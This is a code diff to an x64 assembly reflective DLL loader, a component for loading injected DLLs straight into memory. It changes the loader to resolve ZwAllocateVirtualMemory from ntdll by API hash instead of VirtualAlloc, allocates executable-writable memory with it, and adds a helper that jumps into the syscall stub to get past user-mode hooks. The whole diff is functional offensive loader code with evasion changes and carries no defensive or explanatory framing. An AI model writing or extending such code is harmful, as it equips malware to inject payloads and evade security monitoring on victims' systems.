@@ -17,7 +17,7 @@ KERNEL32DLL_HASH            EQU 0x6A4ABC5B
 NTDLLDLL_HASH               EQU 0x3CFA685D
 LOADLIBRARYA_HASH           EQU 0xEC0E4E8E
 GETPROCADDRESS_HASH         EQU 0x7C0DFCAA
-VIRTUALALLOC_HASH           EQU 0x91AFCA54
+ZWALLOCATEVIRTUALMEMORY_HASH EQU 0xD33D4AED
 NTFLUSHINSTRUCTIONCACHE_HASH EQU 0x534C0AB8
 
 ; PE / reloc constants
@@ -39,7 +39,7 @@ DLL_PROCESS_ATTACH          EQU 1
 ; Slot names (negative offsets from rbp after push rbp / mov rbp,rsp):
 ;   [rbp - 8 ]  = pLoadLibraryA
 ;   [rbp - 16]  = pGetProcAddress
-;   [rbp - 24]  = pVirtualAlloc
+;   [rbp - 24]  = pZwAllocateVirtualMemory
 ;   [rbp - 32]  = pNtFlushInstructionCache
 ;   [rbp - 40]  = uiLibraryAddress  (image scan ptr / later delta)
 ;   [rbp - 48]  = uiBaseAddress     (new alloc / kernel32 base)
@@ -58,7 +58,7 @@ DLL_PROCESS_ATTACH          EQU 1
 ; ---------------------------------------------------------------------------
 %define pLoadLibraryA           qword [rbp -   8]
 %define pGetProcAddress         qword [rbp -  16]
-%define pVirtualAlloc           qword [rbp -  24]
+%define pZwAllocateVirtualMemory qword [rbp -  24]
 %define pNtFlushInstructionCache qword [rbp - 32]
 %define uiLibraryAddress        qword [rbp -  40]
 %define uiBaseAddress           qword [rbp -  48]
@@ -99,7 +99,7 @@ ReflectiveLoader:
     xor     rax, rax
     mov     pLoadLibraryA,            rax
     mov     pGetProcAddress,          rax
-    mov     pVirtualAlloc,            rax
+    mov     pZwAllocateVirtualMemory, rax
     mov     pNtFlushInstructionCache, rax
     xor     rcx, rcx ; disable base address as parameter. compatible with standard reflective loader.
     test    rcx, rcx
@@ -185,14 +185,14 @@ ReflectiveLoader:
     jmp     .next_module
 
     ; ------------------------------------------------------------------
-    ; process_kernel32: find LoadLibraryA, GetProcAddress, VirtualAlloc
+    ; process_kernel32: find LoadLibraryA, GetProcAddress
     ; ------------------------------------------------------------------
 .process_kernel32:
     mov     rax, uiValueA              ; restore module entry pointer
     mov     r13, [rax + 0x20]          ; DllBase
     mov     uiBaseAddress, r13
     call    .get_export_info           ; sets uiExportDir, uiNameArray, uiNameOrdinals, uiValueC=NumberOfNames
-    mov     usCounter, 3               ; we want 3 functions
+    mov     usCounter, 2               ; we want 2 functions
 
 .k32_export_loop:
     ; bounds check: have we exhausted all exports?
@@ -212,8 +212,6 @@ ReflectiveLoader:
     cmp     eax, LOADLIBRARYA_HASH
     je      .k32_store_func
     cmp     eax, GETPROCADDRESS_HASH
-    je      .k32_store_func
-    cmp     eax, VIRTUALALLOC_HASH
     je      .k32_store_func
     jmp     .k32_next_export
 
@@ -235,12 +233,7 @@ ReflectiveLoader:
     mov     pLoadLibraryA, r14
     jmp     .k32_dec_counter
 .k32_try_gpa:
-    cmp     eax, GETPROCADDRESS_HASH
-    jne     .k32_try_va
     mov     pGetProcAddress, r14
-    jmp     .k32_dec_counter
-.k32_try_va:
-    mov     pVirtualAlloc, r14
 .k32_dec_counter:
     mov     rax, usCounter
     dec     rax
@@ -255,14 +248,14 @@ ReflectiveLoader:
     jmp     .k32_export_loop
 
     ; ------------------------------------------------------------------
-    ; process_ntdll: find NtFlushInstructionCache
+    ; process_ntdll: find NtFlushInstructionCache, ZwAllocateVirtualMemory
     ; ------------------------------------------------------------------
 .process_ntdll:
     mov     rax, uiValueA              ; restore module entry pointer
     mov     r13, [rax + 0x20]          ; DllBase
     mov     uiBaseAddress, r13
     call    .get_export_info           ; sets uiExportDir, uiNameArray, uiNameOrdinals, uiValueC=NumberOfNames
-    mov     usCounter, 1
+    mov     usCounter, 2               ; we want 2 functions
 
 .ntdll_export_loop:
     ; bounds check
@@ -276,9 +269,15 @@ ReflectiveLoader:
     mov     ecx, dword [rcx]
     add     rcx, uiBaseAddress
     call    .hash_funcname
-    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
-    jne     .ntdll_next
+    mov     dwHashValue, rax
 
+    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
+    je      .ntdll_store_func
+    cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
+    je      .ntdll_store_func
+    jmp     .ntdll_next
+
+.ntdll_store_func:
     mov     r14, uiExportDir
     mov     r14d, dword [r14 + 0x1C]
     add     r14, uiBaseAddress
@@ -287,8 +286,20 @@ ReflectiveLoader:
     lea     r14, [r14 + r15*4]
     mov     r14d, dword [r14]
     add     r14, uiBaseAddress
+
+    mov     eax, dword [rbp - 144]     ; dwHashValue low 32
+    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
+    jne     .ntdll_try_zw
     mov     pNtFlushInstructionCache, r14
-    jmp     .check_all_found
+    jmp     .ntdll_dec_counter
+.ntdll_try_zw:
+    mov     pZwAllocateVirtualMemory, r14
+.ntdll_dec_counter:
+    mov     rax, usCounter
+    dec     rax
+    mov     usCounter, rax
+    test    rax, rax
+    jz      .check_all_found
 
 .ntdll_next:
     add     uiNameArray,    4
@@ -302,7 +313,7 @@ ReflectiveLoader:
     mov     rax, pGetProcAddress
     test    rax, rax
     jz      .next_module
-    mov     rax, pVirtualAlloc
+    mov     rax, pZwAllocateVirtualMemory
     test    rax, rax
     jz      .next_module
     mov     rax, pNtFlushInstructionCache
@@ -315,7 +326,7 @@ ReflectiveLoader:
     jmp     .walk_modules
 
     ; =========================================================================
-    ; STEP 2: VirtualAlloc a new region and copy headers
+    ; STEP 2: ZwAllocateVirtualMemory a new region and copy headers
     ; =========================================================================
 .step2:
     ; uiHeaderValue = uiLibraryAddress + e_lfanew
@@ -324,15 +335,24 @@ ReflectiveLoader:
     lea     r12, [rcx + rax]           ; r12 = NT headers VA
     mov     uiHeaderValue, r12
 
-    ; VirtualAlloc(NULL, SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    ; SizeOfImage at OptionalHeader offset 0x38 => NT+0x18+0x38 = NT+0x50
-    sub     rsp, 0x28                  ; shadow space + alignment
-    xor     rcx, rcx                   ; lpAddress = NULL
-    mov     edx, dword [r12 + 0x50]    ; dwSize = SizeOfImage
-    mov     r8d, MEM_RESERVE | MEM_COMMIT
-    mov     r9d, PAGE_EXECUTE_READWRITE
-    call    pVirtualAlloc
-    add     rsp, 0x28
+    ; ZwAllocateVirtualMemory(-1, &BaseAddress, 0, &RegionSize,
+    ;                         MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    ; SizeOfImage at NT+0x50
+    ; Stack layout: shadow(0x20) + 2 stack params(0x10) + pad(0x08) + 2 locals(0x10)
+    sub     rsp, 0x48
+    xor     rax, rax
+    mov     [rsp + 0x38], rax          ; local BaseAddress = NULL
+    mov     eax, dword [r12 + 0x50]    ; SizeOfImage
+    mov     [rsp + 0x40], rax          ; local RegionSize = SizeOfImage
+    mov     rcx, -1                    ; ProcessHandle = current process
+    lea     rdx, [rsp + 0x38]          ; pBaseAddress
+    xor     r8, r8                     ; ZeroBits = 0
+    lea     r9, [rsp + 0x40]           ; pRegionSize
+    mov     dword [rsp + 0x20], MEM_RESERVE | MEM_COMMIT
+    mov     dword [rsp + 0x28], PAGE_EXECUTE_READWRITE
+    call    pZwAllocateVirtualMemory
+    mov     rax, [rsp + 0x38]          ; retrieve allocated BaseAddress
+    add     rsp, 0x48
     mov     uiBaseAddress, rax         ; save new base
 
     ; copy headers: SizeOfHeaders bytes from uiLibraryAddress to uiBaseAddress
@@ -575,6 +595,16 @@ ReflectiveLoader:
     pop     rbp
     ret
 
+.direct_syscall_call:
+    ; ========================================================================
+    ; HELPER: .direct_syscall_call
+    ; IN: r10 = Zw function address
+    ; ========================================================================
+    mov eax, dword [r10 + 0x4]
+    lea r11, [r10 + 8]
+    mov r10, rcx
+    jmp r11
+    
     ; =========================================================================
     ; HELPER: .get_export_info
     ; IN:  r13 = module DllBase, uiBaseAddress = same
@@ -620,4 +650,3 @@ ReflectiveLoader:
     jmp     .hfn_loop
 .hfn_done:
     ret
-
